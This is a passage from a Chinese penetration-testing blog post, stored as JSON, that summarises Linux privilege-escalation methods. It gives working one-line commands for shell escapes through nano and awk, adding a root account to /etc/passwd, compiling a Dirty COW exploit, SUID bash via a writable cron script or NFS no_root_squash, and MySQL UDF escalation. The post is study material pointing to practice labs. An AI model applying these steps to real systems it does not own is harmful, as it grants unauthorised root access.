id=\"7-nano\"><a class=\"markdownIt-Anchor\" href=\"#7-nano\">#</a> ⑦ nano</h5>\n<p>进入 shell：</p>\n<pre><code>nano #进入nano编辑器\nCtrl + R\nCtrl + X \n#即可输入命令\n</code></pre>\n<h5 id=\"8-cpmv\"><a class=\"markdownIt-Anchor\" href=\"#8-cpmv\">#</a> ⑧ cp/mv</h5>\n<p>使用 cp 命令覆盖原来的 <code>/etc/passwd</code>  文件</p>\n<p>生成密码：（这里 abcd 为密码）</p>\n<pre><code>$ openssl passwd -1 -salt 1*2*3 abcd\n$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1\n</code></pre>\n<p>将 <code>/etc/passwd</code>  复制到当前位置进行修改</p>\n<p>底部添加：用户名：密码，如：</p>\n<pre><code>moyao:$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1:0:0:root:/root:/bin/bash\n</code></pre>\n<p>即可添加账户</p>\n<h5 id=\"9-awk\"><a class=\"markdownIt-Anchor\" href=\"#9-awk\">#</a> ⑨ awk</h5>\n<p>awk 命令进入 shell：</p>\n<pre><code>awk 'BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;'\n</code></pre>\n<h5 id=\"10-其它\"><a class=\"markdownIt-Anchor\" href=\"#10-其它\">#</a> ⑩ 其它</h5>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20240513094825632.png\" alt=\"image-20240513094825632\"></p>\n<h3 id=\"2-内核漏洞脏牛提权\"><a class=\"markdownIt-Anchor\" href=\"#2-内核漏洞脏牛提权\">#</a> 2 内核漏洞脏牛提权</h3>\n<h5 id=\"1查看版本\"><a class=\"markdownIt-Anchor\" href=\"#1查看版本\">#</a> （1）查看版本</h5>\n<p>查看发行版本：</p>\n<pre><code>cat /etc/issue\n\ncat /etc/*-release\n</code></pre>\n<p>查看内核版本：</p>\n<pre><code>uname -a\n</code></pre>\n<h5 id=\"2msf\"><a class=\"markdownIt-Anchor\" href=\"#2msf\">#</a> （2）msf</h5>\n<p>例如：内核版本 3.2.78</p>\n<p>搜索该版本漏洞：</p>\n<pre><code>searchsploit linux 3.2.78\n</code></pre>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212041598-1644502075.png\" alt=\"img\"></p>\n<p>找到提权脚本：</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212042016-1033310053.png\" alt=\"img\"></p>\n<p>编译：</p>\n<pre><code>gcc -pthread 40839.c -o 40839 -lcrypt\n</code></pre>\n<p>运行后输入密码进行提权：</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212044127-654163967.png\" alt=\"img\"></p>\n<h5 id=\"3linux-exploit-suggester\"><a class=\"markdownIt-Anchor\" href=\"#3linux-exploit-suggester\">#</a> （3）linux-exploit-suggester</h5>\n<p>要出网查 poc，暂时不整理</p>\n<h3 id=\"3-计划任务提权\"><a class=\"markdownIt-Anchor\" href=\"#3-计划任务提权\">#</a> 3 计划任务提权</h3>\n<p>系统内可能会有一些定时执行的任务，一般这些任务由 crontab 来管理，具有所属用户的权限。非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出。</p>\n<p>利用命令如下命令列出一些计划任务</p>\n<pre><code>ls -l /etc/cron*\n\ncat /etc/crontab\n</code></pre>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212049570-772756241.png\" alt=\"img\"></p>\n<p>在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升</p>\n<p>权限配置不当，例如：</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212049975-2144042977.png\" alt=\"img\"></p>\n<p><a href=\"http://xn--roottest-z09lrnp1fu6xurk1wo342giqj799e07xad1e.sh\">发现存在一个 root 身份运行的 test.sh</a>，那我们当相应的目录下去查看一下这个计划任务</p>\n<pre><code>cd /sbin;ls -l test.sh\n</code></pre>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050205-1914296344.png\" alt=\"img\"></p>\n<p>发现这里权限配置为 777，就是说我们普通用户也能去修改这个 test.sh 文件，那我们对文件进行修改，然后进行提权。</p>\n<pre><code>cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;\n</code></pre>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050438-1720194396.png\" alt=\"img\"></p>\n<p>接下来就到 /tmp 等待计划任务的执行</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050685-1766592938.png\" alt=\"img\"></p>\n<p>产生后对 bash 文件进行执行即可进行提权</p>\n<p><img src=\"/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050956-1947031195.png\" alt=\"img\"></p>\n<h3 id=\"4-sudo提权\"><a class=\"markdownIt-Anchor\" href=\"#4-sudo提权\">#</a> 4 sudo 提权</h3>\n<h4 id=\"1免密码\"><a class=\"markdownIt-Anchor\" href=\"#1免密码\">#</a> （1）免密码</h4>\n<h4 id=\"2密码爆破\"><a class=\"markdownIt-Anchor\" href=\"#2密码爆破\">#</a> （2）密码爆破</h4>\n<pre><code>john --user-test test.hash\n</code></pre>\n<h3 id=\"5-密码复用\"><a class=\"markdownIt-Anchor\" href=\"#5-密码复用\">#</a> 5 密码复用</h3>\n<p>字面意思</p>\n<h3 id=\"6-nfs提权\"><a class=\"markdownIt-Anchor\" href=\"#6-nfs提权\">#</a> 6 NFS 提权</h3>\n<p>当服务器中存在 NFS 共享，且开启了 no_root_squash 选项时，这时如果客户端使用的是 root 用户，那么对于共享目录来说，该客户端就有 root 权限，可以使用它来提升权限。</p>\n<p>① 查看 NFS 服务器上的共享目录</p>\n<pre><code>sudo showmount -e x.x.x.x\n</code></pre>\n<p>② 创建本地挂载目录，挂载共享目录。使用攻击者本地 root 权限创建 Suid shell。</p>\n<pre><code>sudo mkdir -p /tmp\n\nsudo mount -t nfs x.x.x.x:/home/test /tmp\n\ncp /bin/bash /tmp/shell\n\nchmod u+s /tmp/shell\n</code></pre>\n<p>③ 回到要提权的服务器上，使用普通用户使用 shell -p 来获取 root 权限。</p>\n<h3 id=\"7-数据库提权\"><a class=\"markdownIt-Anchor\" href=\"#7-数据库提权\">#</a> 7 数据库提权</h3>\n<h4 id=\"1udf提权\"><a class=\"markdownIt-Anchor\" href=\"#1udf提权\">#</a> （1）UDF 提权</h4>\n<p><a href=\"https://www.freebuf.com/articles/database/291175.html\">【数据库提权系列】—【Mysql-UDF 提权篇】 - FreeBuf 网络安全行业门户</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/675466196\">linux 环境下的 MySQL UDF 提权 - 知乎 (zhihu.com)</a></p>\n<h5 id=\"介绍\"><a class=\"markdownIt-Anchor\" href=\"#介绍\">#</a> 介绍：</h5>\n<p>​\t\tUDF（user defind function）用户自定义函数，通过添加新函数，对 MySQL 的功能进行扩充。调用方式与一般系统自带的函数相同，例如 user ()，version () 等函数。</p>\n<p>​\t\tudf 文件后缀在 windows 与 linux 系统下分别为 dll 与 so，即动态链接库文件，由 C、C++ 编写。</p>\n<h5 id=\"利用条件\"><a class=\"markdownIt-Anchor\" href=\"#利用条件\">#</a> 利用条件：</h5>\n<p>1、常规情况：</p>\n<ul>\n<li>\n<p>mysql 配置文件 secure_file_priv 项设置为空，（如果为 NULL 或 /tmp/ 等指定目录，即无法自定义 udf 文件导出位置，则无法利用）；</p>\n</li>\n<li>\n<p>CREATE 权限、FILE 权限（root 用户默认拥有所有权限）。</p>\n</li>\n</ul>\n<p>2、特殊情况：</p>\n<ul>\n<li>INSERT 权限、UPDATE 权限、DELETE 权限。</li>\n</ul>\n<p>查看当前数据库用户权限：</p>\n<pre><code>select * from mysql.user where user = substring_index(user(), '@', 1)\\G;\n</code></pre>\n<h5 id=\"版本特性\"><a class=\"markdownIt-Anchor\" href=\"#版本特性\">#</a> 版本特性</h5>\n<p>udf 提权操作中的一个步骤是将我们的 udf 文件上传到 mysql 的检索目录中，Windows 系统下 mysql 各版本的检索目录有所不同：</p>\n<h4 id=\"2mof提权\"><a class=\"markdownIt-Anchor\" href=\"#2mof提权\">#</a> （2）MOF 提权</h4>\n<h4 id=\"3启动项提权\"><a class=\"markdownIt-Anchor\" href=\"#3启动项提权\">#</a> （3）启动项提权</h4>\n<h4 id=\"4cve-2016-6663-cve-2016-6664组合提权\"><a class=\"markdownIt-Anchor\" href=\"#4cve-2016-6663-cve-2016-6664组合提权\">#</a> （4）CVE-2016-6663、CVE-2016-6664 组合提权</h4>\n<h4 id=\"5反弹端口提权\"><a class=\"markdownIt-Anchor\" href=\"#5反弹端口提权\">#</a> （5）反弹端口提权</h4>\n<h2 id=\"题目\"><a class=\"markdownIt-Anchor\" href=\"#题目\">#</a> 题目</h2>\n<p>这道题应该是专门练提权的：<a href=\"https://www.vulnhub.com/entry/42challenge-1,465/\">42Challenge: 1 ~ VulnHub</a></p>\n<p>windows：<a href=\"https://www.freebuf.com/articles/network/277954.html\">内网渗透基石篇–权限提升（上） - FreeBuf 网络安全行业门户</a></p>\n<p>linux 内核：<a href=\"https://blog.csdn.net/qq_29864185/article/details/107154916\">渗透测试 — 提权方式总结_渗透提权 - CSDN 博客</a></p>\n<p><a href=\"https://www.cnblogs.com/sfsec/p/15163907.html\">最详细 Linux 提权总结（建议收藏） - 随风 kali - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://www.cnblogs.com/sfsec/p/15162635.html\">最全 Windows 提权总结（建议收藏） - 随风 kali - 博客园 (cnblogs.com)</a></p>\n",
            "tags": [
                "pentesting"
            ]
        }
    ]
}